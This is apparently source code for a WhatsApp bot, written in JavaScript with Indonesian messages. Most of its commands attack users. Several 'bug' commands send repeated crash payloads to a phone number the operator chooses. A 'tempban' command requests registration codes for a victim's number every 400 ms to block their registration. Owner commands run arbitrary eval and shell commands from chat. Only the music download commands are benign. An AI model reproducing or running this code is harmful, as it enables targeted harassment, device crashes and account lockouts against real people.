case 'misi-ganas': case 'ewe-ditempat':case 'ngapain-dek': case 'segini-doang': case 'sc-lawack': case 'kroco-diam': case 'lawack-dek': case 'rusdi-jomok': case 'simanis-entod': case 'cipok-kakgem': {
if (!isCreator) return reply(mess.OnlyOwner)
await reply(mess.bugrespon)
jumlah = 25
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
Zynxzoo.sendMessage(from, {text: `\`ᎪᏞᎪᎷᎪᏦೄྀ\``}, {quoted: m})
await sleep(500)
Zynxzoo.sendMessage(from, {text: `\`ᎪᏞᎪᎷᎪᏦೄྀ\``}, {quoted: m})
await sleep(500)
Zynxzoo.sendMessage(from, {text: `\`ᎪᏞᎪᎷᎪᏦೄྀ\``}, {quoted: m})
await sleep(500)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
Zynxzoo.sendMessage(from, {text: `\`ᎪᏞᎪᎷᎪᏦೄྀ\``}, {quoted: m})
await sleep(500)
await sleep(500)
Zynxzoo.sendMessage(from, {text: `\`ᎪᏞᎪᎷᎪᏦೄྀ\``}, {quoted: m})
await sleep(500)
await sleep(500)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
Zynxzoo.sendMessage(from, {text: `\`ᎪᏞᎪᎷᎪᏦೄྀ\``}, {quoted: m})
await sleep(500)
Zynxzoo.sendMessage(from, {text: `\`ᎪᏞᎪᎷᎪᏦᏦೄྀ\``}, {quoted: m})
await sleep(500)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
await sleep(500)
await reply(mess.donebug)
}
break

case '😘': case '😂': case '❤': case '💥': case '😁': case '😅': case '🙏': case '👌': case '💯': {
if (!isCreator) return reply(mess.OnlyOwner)
await reply(mess.bugrespon)
jumlah = 25
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
Zynxzoo.sendMessage(from, {text: `\`ᎷᎪᎷᏢႮՏ ᏞႮೄྀ\``}, {quoted: m})
await sleep(500)
Zynxzoo.sendMessage(from, {text: `\`ᎷᎪᎷᏢႮՏ ᏞႮೄྀ\``}, {quoted: m})
await sleep(500)
Zynxzoo.sendMessage(from, {text: `\`ᎷᎪᎷᏢႮՏ ᏞႮೄྀ\``}, {quoted: m})
await sleep(500)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
Zynxzoo.sendMessage(from, {text: `\`ᎷᎪᎷᏢႮՏ ᏞႮೄྀ\``}, {quoted: m})
await sleep(500)
Zynxzoo.sendMessage(from, {text: `\`ᎷᎪᎷᏢႮՏ ᏞႮೄྀ\``}, {quoted: m})
await sleep(500)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
sendTempatMessages(from, jumlah)
sendGacorMessages(from, jumlah)
await sleep(500)
await reply(mess.donebug)
}
break

case '🗿': case '📦': case '🥵':  case '🥶': case '😈': case '😹': case '👽': case '😡': case '💀': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!isPremium) return reply(`LU SIAPA BEGO?`)
if (!text) return reply(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let Pe = peler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendPaymentInfoMessage(Pe)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
Zynxzoo.sendMessage(Pe, {text: `\`ᏃᎬᎡϴ ᏴᎬͲᎪೄྀ\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`ᏃᎬᎡϴ ᏴᎬͲᎪೄྀ\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`ᏃᎬᎡϴ ᏴᎬͲᎪೄྀ\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`ᏃᎬᎡϴ ᏴᎬͲᎪೄྀ\``}, {quoted: m})
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
}
await reply(mess.donebug)
}
break

case 'tempban': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!text) return reply(`Example: ${prefix + command} 62|8xxx`)
if (!/|/.test(text)) return reply(`Kek gini tolol \n ${prefix + command} 62|8626648282`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban/ban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await reply(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state } = await useMultiFileAuthState('tempban')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: '+' + fullNo,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(100)
await dropNumber()
}
} catch (error) {
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban/ban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'selebmode': {
if (!isCreator) return reply(mess.OnlyOwner)
global.public = false
reply('*MODE SELEB TELAH DIAKTIFKAN*')
}
break

case 'warmode': {
if (!isCreator) return reply(mess.OnlyOwner)
global.public = true
reply('*GAS WAR PARA PENGGUNAKU*')
}
break

case 'play': {
	if (!text) return reply(`*Example*: ${prefix + command} drunk text`)
	const randomReduction = Math.floor(Math.random() * 5) + 1;
	let search = await yts(text);
	let telaso = search.all[0].url;
	let body = `*Music - Play*
> Title : *${search.all[0].title}*
> Views : *${search.all[0].views}*
> Duration : *${search.all[0].timestamp}*
> Uploaded : *${search.all[0].ago}*
> Url : *${telaso}*

please reply ${prefix}*mp3/mp4* to download`;
	Zynxzoo.sendMessage(m.chat, {
		image: {
			url: search.all[0].thumbnail
		},
		caption: body
	}, {
		quoted: m
	});
}
break

case 'mp4': {
	if (!m.quoted) return reply('Reply Pesan')
	let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
	if (!urls) return reply('Mungkin pesan yang anda reply tidak mengandung URL YouTube');
	let urlIndex = parseInt(text) - 1;
	if (urlIndex < 0 || urlIndex >= urls.length) return reply('Indeks URL tidak valid');
	await downloadMp4(urls);
}
break

case 'mp3': {
	if (!m.quoted) return reply('Reply Pesan');
	let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
	if (!urls) return reply('Mungkin pesan yang anda reply tidak mengandung URL YouTube');
	let urlIndex = parseInt(text) - 1;
	if (urlIndex < 0 || urlIndex >= urls.length)
		return reply('Indeks URL tidak valid');
	await downloadMp3(urls);
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
